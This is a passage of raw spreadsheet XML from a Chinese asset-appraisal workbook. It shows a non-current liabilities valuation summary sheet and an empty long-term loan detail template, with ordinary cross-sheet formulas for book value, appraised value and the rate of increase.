    <row r="27" s="415">
      <c r="A27" s="116" t="n"/>
    </row>
    <row r="28" s="415">
      <c r="A28" s="116" t="n"/>
    </row>
  </sheetData>
  <mergeCells count="4">
    <mergeCell ref="B4:E4"/>
    <mergeCell ref="B1:J1"/>
    <mergeCell ref="B2:J2"/>
    <mergeCell ref="B26:C26"/>
  </mergeCells>
  <conditionalFormatting sqref="B5:J26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9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 codeName="Sheet96">
    <tabColor rgb="FFFFFF00"/>
    <outlinePr summaryBelow="1" summaryRight="1"/>
    <pageSetUpPr fitToPage="1"/>
  </sheetPr>
  <dimension ref="A1:H27"/>
  <sheetViews>
    <sheetView view="pageBreakPreview" topLeftCell="A6" zoomScaleNormal="100" workbookViewId="0">
      <selection activeCell="A27" sqref="A27"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr baseColWidth="8" defaultColWidth="9" defaultRowHeight="15.75" customHeight="1"/>
  <cols>
    <col width="9" customWidth="1" style="410" min="1" max="1"/>
    <col width="6.16666666666667" customWidth="1" style="410" min="2" max="2"/>
    <col hidden="1" width="6.16666666666667" customWidth="1" style="410" min="3" max="3"/>
    <col width="25.5" customWidth="1" style="410" min="4" max="4"/>
    <col width="21.8333333333333" customWidth="1" style="410" min="5" max="5"/>
    <col width="20.6666666666667" customWidth="1" style="410" min="6" max="6"/>
    <col width="21" customWidth="1" style="410" min="7" max="7"/>
    <col width="17.3333333333333" customWidth="1" style="410" min="8" max="8"/>
    <col width="9" customWidth="1" style="410" min="9" max="16384"/>
  </cols>
  <sheetData>
    <row r="1" ht="30" customFormat="1" customHeight="1" s="368">
      <c r="B1" s="371" t="inlineStr">
        <is>
          <t>非流动负债评估汇总表</t>
        </is>
      </c>
    </row>
    <row r="2" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="B2" s="547">
        <f>'2-分类汇总'!B2</f>
        <v/>
      </c>
    </row>
    <row r="3" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="B3" s="547" t="n"/>
      <c r="C3" s="547" t="n"/>
      <c r="D3" s="547" t="n"/>
      <c r="E3" s="547" t="n"/>
      <c r="F3" s="547" t="n"/>
      <c r="G3" s="547" t="n"/>
      <c r="H3" s="548" t="inlineStr">
        <is>
          <t>表6</t>
        </is>
      </c>
    </row>
    <row r="4" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="B4" s="571">
        <f>'2-分类汇总'!B4</f>
        <v/>
      </c>
      <c r="C4" s="554" t="n"/>
      <c r="D4" s="554" t="n"/>
      <c r="E4" s="554" t="n"/>
      <c r="F4" s="376" t="n"/>
      <c r="G4" s="376" t="n"/>
      <c r="H4" s="402">
        <f>'2-分类汇总'!H4</f>
        <v/>
      </c>
    </row>
    <row r="5" ht="16.5" customFormat="1" customHeight="1" s="369">
      <c r="B5" s="284" t="inlineStr">
        <is>
          <t>编号</t>
        </is>
      </c>
      <c r="C5" s="284" t="inlineStr">
        <is>
          <t>项目编号</t>
        </is>
      </c>
      <c r="D5" s="284" t="inlineStr">
        <is>
          <t>科目名称</t>
        </is>
      </c>
      <c r="E5" s="552" t="inlineStr">
        <is>
          <t>账面价值</t>
        </is>
      </c>
      <c r="F5" s="552" t="inlineStr">
        <is>
          <t>评估价值</t>
        </is>
      </c>
      <c r="G5" s="552" t="inlineStr">
        <is>
          <t>增值额</t>
        </is>
      </c>
      <c r="H5" s="552" t="inlineStr">
        <is>
          <t>增值率%</t>
        </is>
      </c>
    </row>
    <row r="6" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="B6" s="284" t="inlineStr">
        <is>
          <t>6-1</t>
        </is>
      </c>
      <c r="C6" s="284" t="inlineStr">
        <is>
          <t>长期借款</t>
        </is>
      </c>
      <c r="D6" s="383" t="inlineStr">
        <is>
          <t>长期借款</t>
        </is>
      </c>
      <c r="E6" s="555">
        <f>'6-1长期借款'!J29</f>
        <v/>
      </c>
      <c r="F6" s="555">
        <f>'6-1长期借款'!L29</f>
        <v/>
      </c>
      <c r="G6" s="555">
        <f>F6-E6</f>
        <v/>
      </c>
      <c r="H6" s="615">
        <f>IF(E6=0,"",G6/E6*100)</f>
        <v/>
      </c>
    </row>
    <row r="7" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="B7" s="284" t="inlineStr">
        <is>
          <t>6-2</t>
        </is>
      </c>
      <c r="C7" s="284" t="inlineStr">
        <is>
          <t>应付债券</t>
        </is>
      </c>
      <c r="D7" s="383" t="inlineStr">
        <is>
          <t>应付债券</t>
        </is>
      </c>
      <c r="E7" s="555">
        <f>'6-2应付债券'!H28</f>
        <v/>
      </c>
      <c r="F7" s="555">
        <f>'6-2应付债券'!I28</f>
        <v/>
      </c>
      <c r="G7" s="555">
        <f>F7-E7</f>
        <v/>
      </c>
      <c r="H7" s="615">
        <f>IF(E7=0,"",G7/E7*100)</f>
        <v/>
      </c>
    </row>
    <row r="8" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="B8" s="284" t="inlineStr">
        <is>
          <t>6-3</t>
        </is>
      </c>
      <c r="C8" s="284" t="inlineStr">
        <is>
          <t>租赁负债</t>
        </is>
      </c>
      <c r="D8" s="423" t="inlineStr">
        <is>
          <t>租赁负债</t>
        </is>
      </c>
      <c r="E8" s="555">
        <f>'6-3租赁负债'!G28</f>
        <v/>
      </c>
      <c r="F8" s="555">
        <f>'6-3租赁负债'!H28</f>
        <v/>
      </c>
      <c r="G8" s="555">
        <f>F8-E8</f>
        <v/>
      </c>
      <c r="H8" s="615">
        <f>IF(E8=0,"",G8/E8*100)</f>
        <v/>
      </c>
    </row>
    <row r="9" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="B9" s="284" t="inlineStr">
        <is>
          <t>6-4</t>
        </is>
      </c>
      <c r="C9" s="284" t="inlineStr">
        <is>
          <t>长期应付</t>
        </is>
      </c>
      <c r="D9" s="383" t="inlineStr">
        <is>
          <t>长期应付款</t>
        </is>
      </c>
      <c r="E9" s="555">
        <f>'6-4长期应付款'!K30</f>
        <v/>
      </c>
      <c r="F9" s="555">
        <f>'6-4长期应付款'!L30</f>
        <v/>
      </c>
      <c r="G9" s="555">
        <f>F9-E9</f>
        <v/>
      </c>
      <c r="H9" s="615">
        <f>IF(E9=0,"",G9/E9*100)</f>
        <v/>
      </c>
    </row>
    <row r="10" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="B10" s="284" t="inlineStr">
        <is>
          <t>6-5</t>
        </is>
      </c>
      <c r="C10" s="284" t="inlineStr">
        <is>
          <t>长期薪酬</t>
        </is>
      </c>
      <c r="D10" s="423" t="inlineStr">
        <is>
          <t>长期应付职工薪酬</t>
        </is>
      </c>
      <c r="E10" s="555">
        <f>'6-5长期应付职工薪酬'!E26</f>
        <v/>
      </c>
      <c r="F10" s="555">
        <f>'6-5长期应付职工薪酬'!F26</f>
        <v/>
      </c>
      <c r="G10" s="555">
        <f>F10-E10</f>
        <v/>
      </c>
      <c r="H10" s="615">
        <f>IF(E10=0,"",G10/E10*100)</f>
        <v/>
      </c>
    </row>
    <row r="11" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="B11" s="284" t="inlineStr">
        <is>
          <t>6-6</t>
        </is>
      </c>
      <c r="C11" s="284" t="inlineStr">
        <is>
          <t>预计负债</t>
        </is>
      </c>
      <c r="D11" s="383" t="inlineStr">
        <is>
          <t>预计负债</t>
        </is>
      </c>
      <c r="E11" s="555">
        <f>'6-6预计负债'!F28</f>
        <v/>
      </c>
      <c r="F11" s="555">
        <f>'6-6预计负债'!G28</f>
        <v/>
      </c>
      <c r="G11" s="555">
        <f>F11-E11</f>
        <v/>
      </c>
      <c r="H11" s="615">
        <f>IF(E11=0,"",G11/E11*100)</f>
        <v/>
      </c>
    </row>
    <row r="12" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="B12" s="284" t="inlineStr">
        <is>
          <t>6-7</t>
        </is>
      </c>
      <c r="C12" s="284" t="inlineStr">
        <is>
          <t>递延收益</t>
        </is>
      </c>
      <c r="D12" s="423" t="inlineStr">
        <is>
          <t>递延收益</t>
        </is>
      </c>
      <c r="E12" s="555">
        <f>'6-7递延收益'!G28</f>
        <v/>
      </c>
      <c r="F12" s="555">
        <f>'6-7递延收益'!H28</f>
        <v/>
      </c>
      <c r="G12" s="555">
        <f>F12-E12</f>
        <v/>
      </c>
      <c r="H12" s="615">
        <f>IF(E12=0,"",G12/E12*100)</f>
        <v/>
      </c>
    </row>
    <row r="13" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="B13" s="284" t="inlineStr">
        <is>
          <t>6-8</t>
        </is>
      </c>
      <c r="C13" s="284" t="inlineStr">
        <is>
          <t>递延负债</t>
        </is>
      </c>
      <c r="D13" s="383" t="inlineStr">
        <is>
          <t>递延所得税负债</t>
        </is>
      </c>
      <c r="E13" s="555">
        <f>'6-8递延所得税负债'!E28</f>
        <v/>
      </c>
      <c r="F13" s="555">
        <f>'6-8递延所得税负债'!F28</f>
        <v/>
      </c>
      <c r="G13" s="555">
        <f>F13-E13</f>
        <v/>
      </c>
      <c r="H13" s="615">
        <f>IF(E13=0,"",G13/E13*100)</f>
        <v/>
      </c>
    </row>
    <row r="14" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="B14" s="284" t="inlineStr">
        <is>
          <t>6-9</t>
        </is>
      </c>
      <c r="C14" s="284" t="inlineStr">
        <is>
          <t>其他非债</t>
        </is>
      </c>
      <c r="D14" s="383" t="inlineStr">
        <is>
          <t>其他非流动负债</t>
        </is>
      </c>
      <c r="E14" s="555">
        <f>'6-9其他非流动负债'!F28</f>
        <v/>
      </c>
      <c r="F14" s="555">
        <f>'6-9其他非流动负债'!G28</f>
        <v/>
      </c>
      <c r="G14" s="555">
        <f>F14-E14</f>
        <v/>
      </c>
      <c r="H14" s="615">
        <f>IF(E14=0,"",G14/E14*100)</f>
        <v/>
      </c>
    </row>
    <row r="15" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="B15" s="380" t="n"/>
      <c r="C15" s="380" t="n"/>
      <c r="D15" s="383" t="n"/>
      <c r="E15" s="555" t="n"/>
      <c r="F15" s="555" t="n"/>
      <c r="G15" s="555" t="n"/>
      <c r="H15" s="615">
        <f>IF(E15=0,"",G15/E15*100)</f>
        <v/>
      </c>
    </row>
    <row r="16" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="B16" s="380" t="n"/>
      <c r="C16" s="380" t="n"/>
      <c r="D16" s="383" t="n"/>
      <c r="E16" s="555" t="n"/>
      <c r="F16" s="555" t="n"/>
      <c r="G16" s="555" t="n"/>
      <c r="H16" s="615">
        <f>IF(E16=0,"",G16/E16*100)</f>
        <v/>
      </c>
    </row>
    <row r="17" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="B17" s="380" t="n"/>
      <c r="C17" s="380" t="n"/>
      <c r="D17" s="383" t="n"/>
      <c r="E17" s="555" t="n"/>
      <c r="F17" s="555" t="n"/>
      <c r="G17" s="555" t="n"/>
      <c r="H17" s="615">
        <f>IF(E17=0,"",G17/E17*100)</f>
        <v/>
      </c>
    </row>
    <row r="18" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="B18" s="380" t="n"/>
      <c r="C18" s="380" t="n"/>
      <c r="D18" s="383" t="n"/>
      <c r="E18" s="555" t="n"/>
      <c r="F18" s="555" t="n"/>
      <c r="G18" s="555" t="n"/>
      <c r="H18" s="615">
        <f>IF(E18=0,"",G18/E18*100)</f>
        <v/>
      </c>
    </row>
    <row r="19" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="B19" s="380" t="n"/>
      <c r="C19" s="380" t="n"/>
      <c r="D19" s="383" t="n"/>
      <c r="E19" s="555" t="n"/>
      <c r="F19" s="555" t="n"/>
      <c r="G19" s="555" t="n"/>
      <c r="H19" s="615">
        <f>IF(E19=0,"",G19/E19*100)</f>
        <v/>
      </c>
    </row>
    <row r="20" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="B20" s="380" t="n"/>
      <c r="C20" s="380" t="n"/>
      <c r="D20" s="383" t="n"/>
      <c r="E20" s="555" t="n"/>
      <c r="F20" s="555" t="n"/>
      <c r="G20" s="555" t="n"/>
      <c r="H20" s="615">
        <f>IF(E20=0,"",G20/E20*100)</f>
        <v/>
      </c>
    </row>
    <row r="21" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="B21" s="380" t="n"/>
      <c r="C21" s="380" t="n"/>
      <c r="D21" s="383" t="n"/>
      <c r="E21" s="555" t="n"/>
      <c r="F21" s="555" t="n"/>
      <c r="G21" s="555" t="n"/>
      <c r="H21" s="615">
        <f>IF(E21=0,"",G21/E21*100)</f>
        <v/>
      </c>
    </row>
    <row r="22" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="B22" s="380" t="n"/>
      <c r="C22" s="380" t="n"/>
      <c r="D22" s="383" t="n"/>
      <c r="E22" s="555" t="n"/>
      <c r="F22" s="555" t="n"/>
      <c r="G22" s="555" t="n"/>
      <c r="H22" s="615">
        <f>IF(E22=0,"",G22/E22*100)</f>
        <v/>
      </c>
    </row>
    <row r="23" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="B23" s="380" t="n"/>
      <c r="C23" s="380" t="n"/>
      <c r="D23" s="383" t="n"/>
      <c r="E23" s="555" t="n"/>
      <c r="F23" s="555" t="n"/>
      <c r="G23" s="555" t="n"/>
      <c r="H23" s="615">
        <f>IF(E23=0,"",G23/E23*100)</f>
        <v/>
      </c>
    </row>
    <row r="24" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="B24" s="380" t="n"/>
      <c r="C24" s="380" t="n"/>
      <c r="D24" s="383" t="n"/>
      <c r="E24" s="555" t="n"/>
      <c r="F24" s="555" t="n"/>
      <c r="G24" s="555" t="n"/>
      <c r="H24" s="615">
        <f>IF(E24=0,"",G24/E24*100)</f>
        <v/>
      </c>
    </row>
    <row r="25" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="B25" s="284" t="n"/>
      <c r="C25" s="284" t="n"/>
      <c r="D25" s="145" t="n"/>
      <c r="E25" s="555" t="n"/>
      <c r="F25" s="555" t="n"/>
      <c r="G25" s="555" t="n"/>
      <c r="H25" s="615">
        <f>IF(E25=0,"",G25/E25*100)</f>
        <v/>
      </c>
    </row>
    <row r="26" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="B26" s="284" t="n"/>
      <c r="C26" s="284" t="n"/>
      <c r="D26" s="145" t="n"/>
      <c r="E26" s="555" t="n"/>
      <c r="F26" s="555" t="n"/>
      <c r="G26" s="555" t="n"/>
      <c r="H26" s="615">
        <f>IF(E26=0,"",G26/E26*100)</f>
        <v/>
      </c>
    </row>
    <row r="27" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A27" s="116" t="inlineStr">
        <is>
          <t>合计1</t>
        </is>
      </c>
      <c r="B27" s="383" t="n"/>
      <c r="C27" s="423" t="inlineStr">
        <is>
          <t>非债汇总</t>
        </is>
      </c>
      <c r="D27" s="380" t="inlineStr">
        <is>
          <t>非流动负债合计</t>
        </is>
      </c>
      <c r="E27" s="555">
        <f>ROUND(SUM(E6:E26),2)</f>
        <v/>
      </c>
      <c r="F27" s="555">
        <f>ROUND(SUM(F6:F26),2)</f>
        <v/>
      </c>
      <c r="G27" s="555">
        <f>F27-E27</f>
        <v/>
      </c>
      <c r="H27" s="615">
        <f>IF(E27=0,"",G27/E27*100)</f>
        <v/>
      </c>
    </row>
  </sheetData>
  <mergeCells count="3">
    <mergeCell ref="B1:H1"/>
    <mergeCell ref="B2:H2"/>
    <mergeCell ref="B4:E4"/>
  </mergeCells>
  <printOptions horizontalCentered="1"/>
  <pageMargins left="0.590551181102362" right="0.590551181102362" top="0.866141732283464" bottom="0.972222222222222" header="0.47244094488189" footer="0.597222222222222"/>
  <pageSetup orientation="landscape" paperSize="9" fitToHeight="0" blackAndWhite="1"/>
</worksheet>
</file>

<file path=xl/worksheets/sheet100.xml><?xml version="1.0" encoding="utf-8"?>
<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
  <sheetPr codeName="Sheet97">
    <outlinePr summaryBelow="1" summaryRight="1"/>
    <pageSetUpPr fitToPage="1"/>
  </sheetPr>
  <dimension ref="A1:O29"/>
  <sheetViews>
    <sheetView view="pageBreakPreview" zoomScaleNormal="100" workbookViewId="0">
      <selection activeCell="A6" sqref="A6:A28"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr baseColWidth="8" defaultColWidth="9" defaultRowHeight="15.75" customHeight="1"/>
  <cols>
    <col width="12.8333333333333" customWidth="1" style="410" min="1" max="1"/>
    <col width="10.6666666666667" customWidth="1" style="410" min="2" max="2"/>
    <col width="30.1666666666667" customWidth="1" style="410" min="3" max="3"/>
    <col width="10.6666666666667" customWidth="1" style="410" min="4" max="5"/>
    <col width="12.1666666666667" customWidth="1" style="410" min="6" max="6"/>
    <col outlineLevel="1" width="8.16666666666667" customWidth="1" style="410" min="7" max="7"/>
    <col outlineLevel="1" width="11.5" customWidth="1" style="410" min="8" max="8"/>
    <col outlineLevel="1" width="12" customWidth="1" style="410" min="9" max="9"/>
    <col width="15.6666666666667" customWidth="1" style="410" min="10" max="10"/>
    <col hidden="1" width="14.8333333333333" customWidth="1" style="410" min="11" max="11"/>
    <col outlineLevel="1" width="15.6666666666667" customWidth="1" style="410" min="12" max="13"/>
    <col outlineLevel="1" width="8.66666666666667" customWidth="1" style="410" min="14" max="14"/>
    <col width="10.6666666666667" customWidth="1" style="410" min="15" max="15"/>
    <col width="9" customWidth="1" style="410" min="16" max="16384"/>
  </cols>
  <sheetData>
    <row r="1" ht="30" customFormat="1" customHeight="1" s="368">
      <c r="A1" s="116" t="inlineStr">
        <is>
          <t>表头区域</t>
        </is>
      </c>
      <c r="B1" s="371" t="inlineStr">
        <is>
          <t>长期借款评估明细表</t>
        </is>
      </c>
    </row>
    <row r="2" ht="16.5" customFormat="1" customHeight="1" s="342">
      <c r="A2" s="116" t="inlineStr">
        <is>
          <t>表头区域</t>
        </is>
      </c>
      <c r="B2" s="547">
        <f>'2-分类汇总'!B2</f>
        <v/>
      </c>
    </row>
    <row r="3" ht="16.5" customFormat="1" customHeight="1" s="342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373" t="n"/>
      <c r="K3" s="373" t="n"/>
      <c r="L3" s="373" t="n"/>
      <c r="M3" s="373" t="n"/>
      <c r="N3" s="373" t="n"/>
      <c r="O3" s="402" t="inlineStr">
        <is>
          <t>表6-1</t>
        </is>
      </c>
    </row>
    <row r="4" ht="16.5" customFormat="1" customHeight="1" s="342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54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402">
        <f>'2-分类汇总'!H4</f>
        <v/>
      </c>
    </row>
    <row r="5" ht="16.5" customFormat="1" customHeight="1" s="237">
      <c r="A5" s="116" t="inlineStr">
        <is>
          <t>检索表头</t>
        </is>
      </c>
      <c r="B5" s="380" t="inlineStr">
        <is>
          <t>序号</t>
        </is>
      </c>
      <c r="C5" s="380" t="inlineStr">
        <is>
          <t>放款银行（或机构）名称</t>
        </is>
      </c>
      <c r="D5" s="380" t="inlineStr">
        <is>
          <t>发生日期</t>
        </is>
      </c>
      <c r="E5" s="380" t="inlineStr">
        <is>
          <t>到期日</t>
        </is>
      </c>
      <c r="F5" s="380" t="inlineStr">
        <is>
          <t>年利率%</t>
        </is>
      </c>
      <c r="G5" s="379" t="inlineStr">
        <is>
          <t>币种</t>
        </is>
      </c>
      <c r="H5" s="379" t="inlineStr">
        <is>
          <t>外币账面金额</t>
        </is>
      </c>
      <c r="I5" s="379" t="inlineStr">
        <is>
          <t>评估基准日汇率</t>
        </is>
      </c>
      <c r="J5" s="307" t="inlineStr">
        <is>
          <t>账面价值</t>
        </is>
      </c>
      <c r="K5" s="380" t="inlineStr">
        <is>
          <t>外币基准日汇率</t>
        </is>
      </c>
      <c r="L5" s="380" t="inlineStr">
        <is>
          <t>评估价值</t>
        </is>
      </c>
      <c r="M5" s="380" t="inlineStr">
        <is>
          <t>增值额</t>
        </is>
      </c>
      <c r="N5" s="380" t="inlineStr">
        <is>
          <t>增值率%</t>
        </is>
      </c>
      <c r="O5" s="380" t="inlineStr">
        <is>
          <t>备注</t>
        </is>
      </c>
    </row>
    <row r="6" ht="16.5" customFormat="1" customHeight="1" s="342">
      <c r="A6" s="116" t="n"/>
      <c r="B6" s="380" t="n"/>
      <c r="C6" s="381" t="n"/>
      <c r="D6" s="578" t="n"/>
      <c r="E6" s="578" t="n"/>
      <c r="F6" s="115" t="n"/>
      <c r="G6" s="380" t="n"/>
      <c r="H6" s="555" t="n"/>
      <c r="I6" s="588" t="n"/>
      <c r="J6" s="555" t="n"/>
      <c r="K6" s="555" t="n"/>
      <c r="L6" s="555" t="n"/>
      <c r="M6" s="555">
        <f>L6-J6</f>
        <v/>
      </c>
      <c r="N6" s="555">
        <f>IF(J6=0,"",M6/J6*100)</f>
        <v/>
      </c>
      <c r="O6" s="383" t="n"/>
    </row>
    <row r="7" ht="16.5" customFormat="1" customHeight="1" s="342">
      <c r="A7" s="116" t="n"/>
      <c r="B7" s="380" t="n"/>
      <c r="C7" s="381" t="n"/>
      <c r="D7" s="578" t="n"/>
      <c r="E7" s="578" t="n"/>
      <c r="F7" s="380" t="n"/>
      <c r="G7" s="380" t="n"/>
      <c r="H7" s="555" t="n"/>
      <c r="I7" s="588" t="n"/>
      <c r="J7" s="555" t="n"/>
      <c r="K7" s="555" t="n"/>
      <c r="L7" s="555" t="n"/>
      <c r="M7" s="555">
        <f>L7-J7</f>
        <v/>
      </c>
      <c r="N7" s="555">
        <f>IF(J7=0,"",M7/J7*100)</f>
        <v/>
      </c>
      <c r="O7" s="383" t="n"/>
    </row>
    <row r="8" ht="16.5" customFormat="1" customHeight="1" s="342">
      <c r="A8" s="116" t="n"/>
      <c r="B8" s="380" t="n"/>
      <c r="C8" s="381" t="n"/>
      <c r="D8" s="578" t="n"/>
      <c r="E8" s="578" t="n"/>
      <c r="F8" s="380" t="n"/>
      <c r="G8" s="380" t="n"/>
      <c r="H8" s="555" t="n"/>
      <c r="I8" s="588" t="n"/>
      <c r="J8" s="560" t="n"/>
      <c r="K8" s="555" t="n"/>
      <c r="L8" s="555" t="n"/>
      <c r="M8" s="555">
        <f>L8-J8</f>
        <v/>
      </c>
      <c r="N8" s="555">
        <f>IF(J8=0,"",M8/J8*100)</f>
        <v/>
      </c>
      <c r="O8" s="383" t="n"/>
    </row>
    <row r="9" ht="16.5" customFormat="1" customHeight="1" s="342">
      <c r="A9" s="116" t="n"/>
      <c r="B9" s="380" t="n"/>
      <c r="C9" s="381" t="n"/>
      <c r="D9" s="578" t="n"/>
      <c r="E9" s="578" t="n"/>
      <c r="F9" s="380" t="n"/>
      <c r="G9" s="380" t="n"/>
      <c r="H9" s="555" t="n"/>
      <c r="I9" s="588" t="n"/>
      <c r="J9" s="560" t="n"/>
      <c r="K9" s="555" t="n"/>
      <c r="L9" s="555" t="n"/>
      <c r="M9" s="555">
        <f>L9-J9</f>
        <v/>
      </c>
      <c r="N9" s="555">
        <f>IF(J9=0,"",M9/J9*100)</f>
        <v/>
      </c>
      <c r="O9" s="383" t="n"/>
    </row>
    <row r="10" ht="16.5" customFormat="1" customHeight="1" s="342">
      <c r="A10" s="116" t="n"/>
      <c r="B10" s="380" t="n"/>
      <c r="C10" s="381" t="n"/>
      <c r="D10" s="578" t="n"/>
      <c r="E10" s="578" t="n"/>
      <c r="F10" s="380" t="n"/>
      <c r="G10" s="380" t="n"/>
      <c r="H10" s="555" t="n"/>
      <c r="I10" s="588" t="n"/>
      <c r="J10" s="560" t="n"/>
      <c r="K10" s="555" t="n"/>
      <c r="L10" s="555" t="n"/>
      <c r="M10" s="555">
        <f>L10-J10</f>
        <v/>
      </c>
      <c r="N10" s="555">
        <f>IF(J10=0,"",M10/J10*100)</f>
        <v/>
      </c>
      <c r="O10" s="383" t="n"/>
    </row>
    <row r="11" ht="16.5" customFormat="1" customHeight="1" s="342">
      <c r="A11" s="116" t="n"/>
      <c r="B11" s="380" t="n"/>
      <c r="C11" s="381" t="n"/>
      <c r="D11" s="578" t="n"/>
      <c r="E11" s="578" t="n"/>
      <c r="F11" s="380" t="n"/>
      <c r="G11" s="380" t="n"/>
      <c r="H11" s="555" t="n"/>
      <c r="I11" s="588" t="n"/>
      <c r="J11" s="560" t="n"/>
      <c r="K11" s="555" t="n"/>
      <c r="L11" s="555" t="n"/>
      <c r="M11" s="555">
        <f>L11-J11</f>
        <v/>
      </c>
      <c r="N11" s="555">
        <f>IF(J11=0,"",M11/J11*100)</f>
        <v/>
      </c>
      <c r="O11" s="383" t="n"/>
    </row>
    <row r="12" ht="16.5" customFormat="1" customHeight="1" s="342">
      <c r="A12" s="116" t="n"/>
      <c r="B12" s="380" t="n"/>
      <c r="C12" s="381" t="n"/>
      <c r="D12" s="578" t="n"/>
      <c r="E12" s="578" t="n"/>
      <c r="F12" s="380" t="n"/>
      <c r="G12" s="380" t="n"/>
      <c r="H12" s="555" t="n"/>
      <c r="I12" s="588" t="n"/>
      <c r="J12" s="560" t="n"/>
      <c r="K12" s="555" t="n"/>
      <c r="L12" s="555" t="n"/>
      <c r="M12" s="555">
        <f>L12-J12</f>
        <v/>
      </c>
      <c r="N12" s="555">
        <f>IF(J12=0,"",M12/J12*100)</f>
        <v/>
      </c>
      <c r="O12" s="383" t="n"/>
    </row>
    <row r="13" ht="16.5" customFormat="1" customHeight="1" s="342">
      <c r="A13" s="116" t="n"/>
      <c r="B13" s="380" t="n"/>
      <c r="C13" s="381" t="n"/>
      <c r="D13" s="578" t="n"/>
      <c r="E13" s="578" t="n"/>
      <c r="F13" s="380" t="n"/>
      <c r="G13" s="380" t="n"/>
      <c r="H13" s="555" t="n"/>
      <c r="I13" s="588" t="n"/>
      <c r="J13" s="560" t="n"/>
      <c r="K13" s="555" t="n"/>
      <c r="L13" s="555" t="n"/>
      <c r="M13" s="555">
        <f>L13-J13</f>
        <v/>
      </c>
      <c r="N13" s="555">
        <f>IF(J13=0,"",M13/J13*100)</f>
        <v/>
      </c>
      <c r="O13" s="383" t="n"/>
    </row>
    <row r="14" ht="16.5" customFormat="1" customHeight="1" s="342">
      <c r="A14" s="116" t="n"/>
      <c r="B14" s="380" t="n"/>
      <c r="C14" s="381" t="n"/>
      <c r="D14" s="578" t="n"/>
      <c r="E14" s="578" t="n"/>
      <c r="F14" s="380" t="n"/>
      <c r="G14" s="380" t="n"/>
      <c r="H14" s="555" t="n"/>
      <c r="I14" s="588" t="n"/>
      <c r="J14" s="560" t="n"/>
      <c r="K14" s="555" t="n"/>
      <c r="L14" s="555" t="n"/>
      <c r="M14" s="555">
        <f>L14-J14</f>
        <v/>
      </c>
      <c r="N14" s="555">
        <f>IF(J14=0,"",M14/J14*100)</f>
        <v/>
      </c>
      <c r="O14" s="383" t="n"/>
    </row>
    <row r="15" ht="16.5" customFormat="1" customHeight="1" s="342">
      <c r="A15" s="116" t="n"/>
      <c r="B15" s="380" t="n"/>
      <c r="C15" s="381" t="n"/>
      <c r="D15" s="578" t="n"/>
      <c r="E15" s="578" t="n"/>
      <c r="F15" s="380" t="n"/>
      <c r="G15" s="380" t="n"/>
      <c r="H15" s="555" t="n"/>
      <c r="I15" s="588" t="n"/>
      <c r="J15" s="560" t="n"/>
      <c r="K15" s="555" t="n"/>
      <c r="L15" s="555" t="n"/>
      <c r="M15" s="555">
        <f>L15-J15</f>
        <v/>
      </c>
      <c r="N15" s="555">
        <f>IF(J15=0,"",M15/J15*100)</f>
        <v/>
      </c>
      <c r="O15" s="383" t="n"/>
    </row>
    <row r="16" ht="16.5" customFormat="1" customHeight="1" s="342">
      <c r="A16" s="116" t="n"/>
      <c r="B16" s="380" t="n"/>
      <c r="C16" s="381" t="n"/>
      <c r="D16" s="578" t="n"/>
      <c r="E16" s="578" t="n"/>
      <c r="F16" s="380" t="n"/>
      <c r="G16" s="380" t="n"/>
      <c r="H16" s="555" t="n"/>
      <c r="I16" s="588" t="n"/>
      <c r="J16" s="560" t="n"/>
      <c r="K16" s="555" t="n"/>
      <c r="L16" s="555" t="n"/>
      <c r="M16" s="555">
        <f>L16-J16</f>
        <v/>
      </c>
      <c r="N16" s="555">
        <f>IF(J16=0,"",M16/J16*100)</f>
        <v/>
      </c>
      <c r="O16" s="383" t="n"/>
    </row>
    <row r="17" ht="16.5" customFormat="1" customHeight="1" s="342">
      <c r="A17" s="116" t="n"/>
      <c r="B17" s="380" t="n"/>
      <c r="C17" s="381" t="n"/>
      <c r="D17" s="578" t="n"/>
      <c r="E17" s="578" t="n"/>
      <c r="F17" s="380" t="n"/>
      <c r="G17" s="380" t="n"/>
      <c r="H17" s="555" t="n"/>
      <c r="I17" s="588" t="n"/>
      <c r="J17" s="560" t="n"/>
      <c r="K17" s="555" t="n"/>
      <c r="L17" s="555" t="n"/>
      <c r="M17" s="555">
        <f>L17-J17</f>
        <v/>
      </c>
      <c r="N17" s="555">
        <f>IF(J17=0,"",M17/J17*100)</f>
        <v/>
      </c>
      <c r="O17" s="383" t="n"/>
    </row>
    <row r="18" ht="16.5" customFormat="1" customHeight="1" s="342">
      <c r="A18" s="116" t="n"/>
      <c r="B18" s="380" t="n"/>
      <c r="C18" s="381" t="n"/>
      <c r="D18" s="578" t="n"/>
      <c r="E18" s="578" t="n"/>
      <c r="F18" s="380" t="n"/>
      <c r="G18" s="380" t="n"/>
      <c r="H18" s="555" t="n"/>
      <c r="I18" s="588" t="n"/>
      <c r="J18" s="560" t="n"/>
      <c r="K18" s="555" t="n"/>
      <c r="L18" s="555" t="n"/>
      <c r="M18" s="555">
        <f>L18-J18</f>
        <v/>
      </c>
      <c r="N18" s="555">
        <f>IF(J18=0,"",M18/J18*100)</f>
        <v/>
      </c>
